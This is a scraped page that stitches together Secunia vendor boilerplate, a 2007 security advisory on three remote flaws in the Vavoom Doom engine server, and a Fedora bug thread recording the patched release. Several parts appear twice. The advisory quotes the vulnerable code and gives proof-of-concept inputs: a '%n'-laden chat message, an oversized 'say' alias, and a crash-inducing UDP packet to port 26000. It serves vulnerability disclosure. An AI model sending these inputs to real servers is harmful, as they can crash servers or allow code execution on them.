How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

#######################################################################
===============
1) Introduction
===============
Vavoom is an open source engine based on the GPLed Doom engine with
many interesting features.
#######################################################################
=======
2) Bugs
=======
--------------------
A] Say format string
--------------------
format string vulnerability exploitable through the sending of a chat
message, the BroadcastPrintf function is called passing a string
containing the name of the user plus his message without the proper
format argument.
from sv\_main.cpp:
COMMAND(Say)
{
guard(COMMAND Say);
if (Source == SRC\_Command)
{
#ifdef CLIENT
ForwardToServer();
#endif
return;
}
if (Args.Num() < 2)
return;
VStr Text = Player->PlayerName;
Text += ":";
for (int i = 1; i < Args.Num(); i++)
{
Text += " ";
Text += Args[i];
}
GLevelInfo->BroadcastPrintf(\*Text);
GLevelInfo->StartSound(TVec(0, 0, 0), 0,
GSoundManager->GetSoundID("misc/chat"), 0, 1.0, 0);
unguard;
}
----------------------------------
B] BroadcastPrintf buffer-overflow
----------------------------------
buffer-overflow vulnerability located in the BroadcastPrintf function,
the steps for exploiting it are the same of the previous bug.
from p\_thinker.cpp:
void VThinker::BroadcastPrintf(const char \*s, ...)
{
guard(VThinker::BroadcastPrintf);
va\_list v;
char buf[1024];
va\_start(v, s);
vsprintf(buf, s, v);
va\_end(v);
for (int i = 0; i < svs.max\_clients; i++)
if (Level->Game->Players[i])
Level->Game->Players[i]->eventClientPrint(buf);
unguard;
}
---------------------------------
C] "NewLen >= 0" assertion failed
---------------------------------
a failed assert in the following function called, for example, when a
string is passed with an invalid size allows an attacker to terminate
the server.
from str.cpp:
void VStr::Resize(int NewLen)
{
guard(VStr::Resize);
check(NewLen >= 0);
...
#######################################################################
===========
3) The Code
===========
A]
send a chat message containing %n%n%n%n%s
B]
open the cfg file, for example vavoombasevdoom2config.cfg, and add
the following lines
alias bof "say aaa...(992\_'a's)...aaa"
name "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
C]
send an UDP packet (port 26000) containing the following hex bytes:
80 02 ff 00

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

Versions: Windows, DOS, \*nix, \*BSD and more
Platforms: <= 1.24
Bugs: A] Say format string
B] BroadcastPrintf buffer-overflow
C] "NewLen >= 0" assertion failed
Exploitation: remote, versus server
Date: 23 Aug 2007
Author: Luigi Auriemma
e-mail: aluigi@autistici.org

3) The Code
4) Fix
#######################################################################
===============
1) Introduction
===============
Vavoom is an open source engine based on the GPLed Doom engine with
many interesting features.
#######################################################################
=======
2) Bugs
=======
--------------------
A] Say format string
--------------------
format string vulnerability exploitable through the sending of a chat
message, the BroadcastPrintf function is called passing a string
containing the name of the user plus his message without the proper
format argument.
from sv\_main.cpp:
COMMAND(Say)
{
guard(COMMAND Say);
if (Source == SRC\_Command)
{
#ifdef CLIENT
ForwardToServer();
#endif
return;
}
if (Args.Num() < 2)
return;
VStr Text = Player->PlayerName;
Text += ":";
for (int i = 1; i < Args.Num(); i++)
{
Text += " ";
Text += Args[i];
}
GLevelInfo->BroadcastPrintf(\*Text);
GLevelInfo->StartSound(TVec(0, 0, 0), 0,
GSoundManager->GetSoundID("misc/chat"), 0, 1.0, 0);
unguard;
}
----------------------------------
B] BroadcastPrintf buffer-overflow
----------------------------------
buffer-overflow vulnerability located in the BroadcastPrintf function,
the steps for exploiting it are the same of the previous bug.
from p\_thinker.cpp:
void VThinker::BroadcastPrintf(const char \*s, ...)
{
guard(VThinker::BroadcastPrintf);
va\_list v;
char buf[1024];
va\_start(v, s);
vsprintf(buf, s, v);
va\_end(v);
for (int i = 0; i < svs.max\_clients; i++)
if (Level->Game->Players[i])
Level->Game->Players[i]->eventClientPrint(buf);
unguard;
}
---------------------------------
C] "NewLen >= 0" assertion failed
---------------------------------
a failed assert in the following function called, for example, when a
string is passed with an invalid size allows an attacker to terminate
the server.
from str.cpp:
void VStr::Resize(int NewLen)
{
guard(VStr::Resize);
check(NewLen >= 0);
...
#######################################################################
===========
3) The Code
===========
A]
send a chat message containing %n%n%n%n%s
B]
open the cfg file, for example vavoom\basev\doom2\config.cfg, and add
the following lines
alias bof "say aaa...(992\_'a's)...aaa"
name "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
C]
send an UDP packet (port 26000) containing the following hex bytes:
80 02 ff 00

| [Description](show_bug.cgi?id=256621#c0)  Lubomir Kundrak    2007-08-27 14:55:19 UTC  ``` Three problems were identified in Vavoom. See URL for original advisory containing the details.  -------------------- A] Say format string --------------------  format string vulnerability exploitable through the sending of a chat message, the BroadcastPrintf function is called passing a string containing the name of the user plus his message without the proper format argument.  Additional notes:  Please do an update as soon as possible, as first two flaws imply the possibility to execute arbitrary code on behalf of the running server.  ---------------------------------- B] BroadcastPrintf buffer-overflow ----------------------------------  buffer-overflow vulnerability located in the BroadcastPrintf function, the steps for exploiting it are the same of the previous bug.  --------------------------------- C] "NewLen >= 0" assertion failed ---------------------------------  a failed assert in the following function called, for example, when a string is passed with an invalid size allows an attacker to terminate the server.   ```  [Comment 2](show_bug.cgi?id=256621#c2)  Hans de Goede    2007-08-27 17:30:35 UTC  ``` I've contacted upstream about this, usually they are very quick with responses to normal bugs, so I expect a fix from them shortly.    ```  [Comment 3](show_bug.cgi?id=256621#c3)  Fedora Update System    2007-09-04 22:09:42 UTC  ``` vavoom-1.24-3.fc7 has been pushed to the Fedora 7 stable repository.  If problems still persist, please make note of it in this bug report.   ``` |  |
